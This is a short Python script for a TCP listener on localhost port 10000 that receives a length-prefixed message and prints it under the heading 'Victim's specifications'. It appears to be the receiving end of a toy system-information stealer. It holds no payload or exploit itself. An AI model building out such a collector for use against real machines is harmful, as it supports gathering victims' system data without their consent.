import socket


HOST = "127.0.0.1"
PORT = 10000

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"New connection made from {addr}\n")
            message_length_bytes = conn.recv(8)
            message_length = int.from_bytes(message_length_bytes, "little", signed=False)
            system_info = conn.recv(message_length)
            print("Victim's specifications:\n")
            print(system_info.decode())
            print()

if __name__ == "__main__":
    main()